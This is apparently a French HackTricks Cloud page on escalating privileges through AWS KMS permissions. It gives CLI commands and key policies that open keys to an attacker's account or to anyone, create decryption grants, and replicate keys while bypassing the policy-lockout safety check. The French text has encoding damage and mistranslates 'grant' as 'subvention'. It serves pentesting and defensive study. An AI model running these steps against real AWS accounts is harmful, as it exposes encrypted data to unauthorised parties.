# AWS - KMS Privesc

<details>

<summary><strong>Soutenez HackTricks et obtenez des avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## KMS

Pour plus d'informations sur KMS, consultez :

{% content-ref url="../aws-services/aws-kms-enum.md" %}
[aws-kms-enum.md](../aws-services/aws-kms-enum.md)
{% endcontent-ref %}

### `kms:ListKeys`,`kms:PutKeyPolicy`, (`kms:ListKeyPolicies`, `kms:GetKeyPolicy`)

Avec ces autorisations, il est possible de **modifier les autorisations d'acc√®s √† la cl√©** afin qu'elle puisse √™tre utilis√©e par d'autres comptes ou m√™me par n'importe qui :

{% code overflow="wrap" %}
```bash
aws kms list-keys
aws kms list-key-policies --key-id <id> # Bien qu'il n'y en ait qu'un maximum par cl√©
aws kms get-key-policy --key-id <id> --policy-name <policy_name>
# Les cl√©s AWS KMS ne peuvent avoir qu'une seule strat√©gie, vous devez donc utiliser le m√™me nom pour √©craser la strat√©gie (le nom est g√©n√©ralement "default")
aws kms put-key-policy --key-id <id> --policy-name <policy_name> --policy file:///tmp/policy.json
```
{% endcode %}

policy.json :

```json
{
    "Version" : "2012-10-17",
    "Id" : "key-consolepolicy-3",
    "Statement" : [ 
        {
            "Sid" : "Enable IAM User Permissions",
            "Effect" : "Allow",
            "Principal" : {
                "AWS" : "arn:aws:iam::<origin_account>:root"
            },
            "Action" : "kms:*",
            "Resource" : "*"
        }, 
        {
            "Sid" : "Allow all use",
            "Effect" : "Allow",
            "Principal" : {
                "AWS" : "arn:aws:iam::<attackers_account>:root"
            },
            "Action" : [ "kms:*" ],
            "Resource" : "*"
        }
    ]
}
```

### `kms:CreateGrant`

Il **permet √† un principal d'utiliser une cl√© KMS :**

```bash
aws kms create-grant \
    --key-id 1234abcd-12ab-34cd-56ef-1234567890ab \
    --grantee-principal arn:aws:iam::123456789012:user/exampleUser \
    --operations Decrypt
```

{% hint style="warning" %}
Une subvention ne peut autoriser certains types d'op√©rations : [https://docs.aws.amazon.com/kms/latest/developerguide/grants.html#terms-grant-operations](https://docs.aws.amazon.com/kms/latest/developerguide/grants.html#terms-grant-operations)
{% endhint %}

{% hint style="warning" %}
Notez qu'il peut falloir quelques minutes √† KMS pour **autoriser l'utilisateur √† utiliser la cl√© apr√®s que la subvention a √©t√© g√©n√©r√©e**. Une fois ce d√©lai √©coul√©, le principal peut utiliser la cl√© KMS sans avoir besoin de sp√©cifier quoi que ce soit.\
Cependant, s'il est n√©cessaire d'utiliser imm√©diatement la subvention, [utilisez un jeton de subvention](https://docs.aws.amazon.com/kms/latest/developerguide/grant-manage.html#using-grant-token) (consultez le code suivant).\
Pour [**plus d'informations, lisez ceci**](https://docs.aws.amazon.com/kms/latest/developerguide/grant-manage.html#using-grant-token).
{% endhint %}

```bash
# Utilisez le jeton de subvention dans une demande
aws kms generate-data-key \
    --key-id 1234abcd-12ab-34cd-56ef-1234567890ab \
    ‚Äì-key-spec AES_256 \
    --grant-tokens $token
```

Notez qu'il est possible de lister les subventions de cl√©s avec :

```bash
aws kms list-grants --key-id <value>
```

### `kms:CreateKey`, `kms:ReplicateKey`

Avec ces autorisations, il est possible de r√©pliquer une cl√© KMS activ√©e pour plusieurs r√©gions dans une r√©gion diff√©rente avec une politique diff√©rente.

Ainsi, un attaquant pourrait exploiter cela pour obtenir une √©l√©vation de privil√®ges de son acc√®s √† la cl√© et l'utiliser.

{% code overflow="wrap" %}
```bash
aws kms replicate-key --key-id mrk-c10357313a644d69b4b28b88523ef20c --replica-region eu-west-3 --bypass-policy-lockout-safety-check --policy file:///tmp/policy.yml

{
    "Version": "2012-10-17",
    "Id": "key-consolepolicy-3",
    "Statement": [
        {
            "Sid": "Enable IAM User Permissions",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "kms:*",
            "Resource": "*"
        }
    ]
}
```
{% endcode %}

### `kms:Decrypt`

Cette autorisation permet d'utiliser une cl√© pour d√©crypter certaines informations.\
Pour plus d'informations, consultez :

{% content-ref url="../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-pentesting/aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>Soutenez HackTricks et obtenez des avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>